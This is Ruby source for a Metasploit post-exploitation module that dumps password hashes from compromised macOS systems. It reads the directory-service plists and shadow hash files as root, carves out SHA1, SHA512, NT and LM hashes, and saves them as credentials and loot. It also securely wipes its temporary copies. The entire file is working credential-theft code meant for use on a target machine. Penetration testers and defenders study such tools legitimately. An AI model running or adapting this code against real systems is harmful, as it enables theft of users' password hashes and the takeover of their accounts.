##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'


class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OS X Gather Mac OS X Password Hash Collector',
        'Description'   => %q{
            This module dumps SHA-1, LM and NT Hashes of Mac OS X Tiger, Leopard, Snow Leopard and Lion Systems.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Carlos Perez <carlos_perez[at]darkoperator.com>',
          'hammackj <jacob.hammack[at]hammackj.com>'
        ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell' ]
      ))

  end

  # Run Method for when run command is issued
  def run
    case session.type
    when /meterpreter/
      host = session.sys.config.sysinfo["Computer"]
    when /shell/
      host = session.shell_command_token("hostname").chomp
    end
    print_status("Running module against #{host}")
    if root?
      print_status("This session is running as root!")
      dump_hash
    else
      print_error("Insufficient Privileges you must be running as root to dump the hashes")
    end
  end

  #parse the dslocal plist in lion
  def read_ds_xml_plist(plist_content)
    require "rexml/document"

    doc  = REXML::Document.new(plist_content)
    keys = []

    doc.elements.each("plist/dict/key") do |element|
      keys << element.text
    end

    fields = {}
    i = 0
    doc.elements.each("plist/dict/array") do |element|
      data = []
      fields[keys[i]] = data
      element.each_element("*") do |thing|
        data_set = thing.text
        if data_set
          data << data_set.gsub("\n\t\t","")
        else
          data << data_set
        end
      end
      i+=1
    end
    return fields
  end

  # Checks if running as root on the target
  # @return [Bool] current user is root
  def root?
    whoami == 'root'
  end

  # @return [String] name of current user
  def whoami
    @whoami ||= cmd_exec('/usr/bin/whoami').chomp
  end

  # @return [String] version string (e.g. 10.8.5)
  def ver_num
    @version ||= cmd_exec("/usr/bin/sw_vers -productVersion").chomp
  end

  # Dump SHA1 Hashes used by OSX, must be root to get the Hashes
  def dump_hash
    print_status("Dumping Hashes")
    users = []
    nt_hash = nil
    host = session.session_host

    # Path to files with hashes
    sha1_file = ""

    # Check if system is Lion if not continue
    if ver_num =~ /10\.(7)/

      hash_decoded = ""

      # get list of profiles present in the box
      profiles = cmd_exec("ls /private/var/db/dslocal/nodes/Default/users").split("\n")

      if profiles
        profiles.each do |p|
          # Skip none user profiles
          next if p =~ /^_/
          next if p =~ /^daemon|root|nobody/

          # Turn profile plist in to XML format
          cmd_exec("cp","/private/var/db/dslocal/nodes/Default/users/#{p.chomp} /tmp/")
          cmd_exec("plutil","-convert xml1 /tmp/#{p.chomp}")
          file = cmd_exec("cat","/tmp/#{p.chomp}")

          # Clean up using secure delete overwriting and zeroing blocks
          cmd_exec("/usr/bin/srm","-m -z /tmp/#{p.chomp}")

          # Process XML Plist into a usable hash
          plist_values = read_ds_xml_plist(file)

          # Extract the shadow hash data, decode it and format it
          plist_values['ShadowHashData'].join("").unpack('m')[0].each_byte do |b|
            hash_decoded << sprintf("%02X", b)
          end
          user = plist_values['name'].join("")

          # Check if NT HASH is present
          if hash_decoded =~ /4F1010/
            nt_hash = hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)[0][0]
          end

          # Carve out the SHA512 Hash, the first 4 bytes is the salt
          sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]

          print_status("SHA512:#{user}:#{sha512}")
          sha1_file << "#{user}:#{sha512}\n"

          # Reset hash value
          sha512 = ""

          if nt_hash
            print_status("NT:#{user}:#{nt_hash}")
            print_status("Credential saved in database.")
            report_auth_info(
              :host   => host,
              :port   => 445,
              :sname  => 'smb',
              :user   => user,
              :pass   => "AAD3B435B51404EE:#{nt_hash}",
              :active => true
            )

            # Reset hash value
            nt_hash = nil
          end
          # Reset hash value
          hash_decoded = ""
        end
      end
      # Save pwd file
      upassf = store_loot("osx.hashes.sha512", "text/plain", session, sha1_file, "unshadowed_passwd.pwd", "OSX Unshadowed SHA512 Password File")
      print_good("Unshadowed Password File: #{upassf}")

      # If system was lion and it was processed nothing more to do
      return
    end

    users_folder = cmd_exec("/bin/ls", "/Users")

    users_folder.each_line do |u|
      next if u.chomp =~ /Shared|\.localized/
      users << u.chomp
    end
    # Process each user
    users.each do |user|
      if leopard?
        guid = cmd_exec("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
      elsif tiger?
        guid = cmd_exec("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
      end

      # Extract the hashes
      sha1_hash = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
      nt_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
      lm_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c33-64").chomp

      # Check that we have the hashes and save them
      if sha1_hash !~ /00000000000000000000000000000000/
        print_status("SHA1:#{user}:#{sha1_hash}")
        sha1_file << "#{user}:#{sha1_hash}"
      end

      if nt_hash !~ /000000000000000/
        print_status("NT:#{user}:#{nt_hash}")
        print_status("Credential saved in database.")
        report_auth_info(
          :host   => host,
          :port   => 445,
          :sname  => 'smb',
          :user   => user,
          :pass   => "AAD3B435B51404EE:#{nt_hash}",
          :active => true
        )
      end
      if lm_hash !~ /0000000000000/
        print_status("LM:#{user}:#{lm_hash}")
        print_status("Credential saved in database.")
        report_auth_info(
          :host   => host,
          :port   => 445,
          :sname  => 'smb',
          :user   => user,
          :pass   => "#{lm_hash}:",
          :active => true
        )
      end
    end
    # Save pwd file
    upassf = store_loot("osx.hashes.sha1", "text/plain", session, sha1_file, "unshadowed_passwd.pwd", "OSX Unshadowed SHA1 Password File")
    print_good("Unshadowed Password File: #{upassf}")
  end


  # @return [Bool] system version is at least 10.7
  def lion?
    ver_num =~ /10\.(\d+)/ and $1.to_i >= 7
  end


  # @return [Bool] system version is at least 10.5
  def leopard?
    ver_num =~ /10\.(\d+)/ and $1.to_i >= 5
  end

  
  # @return [Bool] system version is 10.4 or lower
  def tiger?
    ver_num =~ /10\.(\d+)/ and $1.to_i <= 4
  end

end
